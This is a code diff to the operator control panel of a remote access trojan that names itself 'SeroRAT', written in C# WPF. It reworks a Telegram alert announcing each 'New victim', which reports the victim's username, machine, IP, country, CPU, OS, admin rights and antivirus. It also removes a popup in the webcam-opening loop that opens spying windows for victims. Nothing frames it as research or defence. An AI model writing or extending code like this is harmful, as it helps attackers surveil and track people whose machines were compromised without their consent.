@@ -329,9 +329,7 @@ public partial class ServerWindow : Window
             if (string.IsNullOrEmpty(token) || string.IsNullOrEmpty(chatId1)) return;
 
             // Global count = total unique HWIDs the server has ever seen
-            int count = _store.AllClients.Count;
-
-            var prefix  = !string.IsNullOrEmpty(c.Payload) ? c.Payload : c.MachineName;
+            int count   = _store.AllClients.Count;
             var admin   = c.IsAdmin ? "Yes" : "No";
             var country = string.IsNullOrEmpty(c.Country) ? "N/A" : c.Country;
             var parisTz = TimeZoneInfo.FindSystemTimeZoneById("Romance Standard Time");
@@ -339,16 +337,15 @@ public partial class ServerWindow : Window
                               .ToString("yyyy-MM-dd HH:mm") + " (Paris)";
 
             var msg =
-                $"New victim #{count} - SeroRAT\n\n" +
+                $"New victim {TgOrdinal(count)} - SeroRAT\n\n" +
                 $"ID: {c.Id}\n" +
                 $"User: {c.Username}@{c.MachineName}\n" +
-                $"Local IP: {c.IP}\n" +
-                $"Public IP: {c.IP}\n" +
+                $"IP: {c.IP}\n" +
                 $"Country: {country}\n" +
+                $"CPU: {c.CpuName}\n" +
                 $"OS: {c.OS}\n" +
                 $"Admin: {admin}\n" +
                 $"AV: {c.Antivirus}\n" +
-                $"Payload: {prefix}\n" +
                 $"Time: {paris}";
 
             using var http = new System.Net.Http.HttpClient { Timeout = TimeSpan.FromSeconds(10) };
@@ -368,6 +365,16 @@ public partial class ServerWindow : Window
             }
         }
         catch { }
+    }
+
+    private static string TgOrdinal(int n)
+    {
+        string suffix = (n % 100) switch
+        {
+            11 or 12 or 13 => "th",
+            _ => (n % 10) switch { 1 => "st", 2 => "nd", 3 => "rd", _ => "th" }
+        };
+        return $"{n}{suffix}";
     }
 
     // ── Server Control ──────────────────────────────
@@ -779,10 +786,7 @@ public partial class ServerWindow : Window
         foreach (var c in clients)
         {
             if (c.CameraStatus.Equals("No", StringComparison.OrdinalIgnoreCase))
-            {
-                MessageBox.Show($"Client {c.Id} has no webcam device.", "No Webcam", MessageBoxButton.OK, MessageBoxImage.Information);
                 continue;
-            }
             int s = (i % maxSteps) * step;
             OpenFeatureWindow<WebcamWindow>(c.Id, () =>
             {
